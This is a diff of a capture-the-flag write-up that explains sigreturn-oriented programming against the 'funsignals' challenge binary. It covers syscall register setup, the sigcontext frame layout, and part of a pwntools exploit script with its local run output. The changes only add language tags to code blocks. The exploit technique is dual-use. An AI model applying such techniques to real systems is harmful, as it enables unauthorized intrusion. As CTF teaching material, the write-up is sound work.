@@ -2,7 +2,7 @@
 
 Let's take a look at the binary (also the goal of this challenge will be to print the flag, not pop a shell):
 
-```
+```console
 $    file funsignals_player_bin
 funsignals_player_bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
 $    pwn checksec funsignals_player_bin
@@ -24,7 +24,7 @@ So we can see that it is a `64` bit statically linked binary, with none of the s
 
 Looking at the code in Ghidra, we see that this isn't a normal binary (probably just assembled versus compiled). Looking at the assembly code we see this:
 
-```
+```nasm
                              //
                              // .shellcode
                              // SHT_PROGBITS  [0x10000000 - 0x1000004a]
@@ -54,7 +54,7 @@ Looking at the code in Ghidra, we see that this isn't a normal binary (probably 
 
 So we can see here, it executes two syscalls. For the first, the registers are equal to this:
 
-```
+```text
 RAX:    0x0
 RDI:    0x0
 RDX:    0x400
@@ -65,7 +65,7 @@ So here it is making a read syscall (check https://blog.rchapman.org/posts/Linux
 
 For the next syscall, the registers are equal to this:
 
-```
+```text
 RAX:    0xf
 RDI:    0x0
 ```
@@ -74,7 +74,7 @@ So here it is performing a Sigreturn syscall. When the kernel delivers a signal 
 
 Also another important thing to note, we can see that the flag is stored in the binary at the address `0x10000023`:
 
-```
+```nasm
                              flag
         10000023 66 61 6b        ds         "fake_flag_here_as_original_is_at_server"
                  65 5f 66
@@ -89,7 +89,7 @@ SROP is really useful in a lot of cases where traditional ROP won't work. It giv
 
 Just if you're curious, this is the sigcontext structure that is stored on the stack, which is used by the `sigreturn` to pop values into the register (for `x64`). This diagram is originally from https://amriunix.com/post/sigreturn-oriented-programming-srop/:
 
-```
+```text
 +--------------------+--------------------+
 | rt_sigeturn()      | uc_flags           |
 +--------------------+--------------------+
@@ -127,17 +127,17 @@ Just if you're curious, this is the sigcontext structure that is stored on the s
 
 So now is the question of what will we do with our syscall. Looking through the code, we can see multiple syscalls (both will work for our purposes, doesn't matter too much for our purposes):
 
-```
+```text
         1000000b 0f 05           SYSCALL
 ```
 
-```
+```text
         10000012 0f 05           SYSCALL
 ```
 
 So using the sigreturn, we can set `rip` to either address and execute a syscall. Since we have control over the registers, we can control what syscall is made. We can just go with a write syscall, to print the contents of the flag to us. To do that, we will need to set the following registers equal to these values:
 
-```
+```text
 RIP:    0x1000000b (address of a syscall, could use other syscalls)
 RAX:    0x1 (specify write syscall)
 RDI:    0x1 (specify stdout to write it to)
@@ -149,7 +149,7 @@ RDX:    0x400 (amount of bytes to print, 0x400 is clearly overkill)
 
 Putting it all together, we have the following exploit. Also one thing, pwntools has the capability to automatically build out a sigreturn frame, you just need to specify what values you want for what registers. It makes this really easy:
 
-```
+```python
 from pwn import *
 
 target = process('./funsignals_player_bin')
@@ -176,7 +176,7 @@ target.interactive()
 
 When we run it:
 
-```
+```console
 $    python exploit.py
 [+] Starting local process './funsignals_player_bin': pid 7092
 [*] Switching to interactive mode
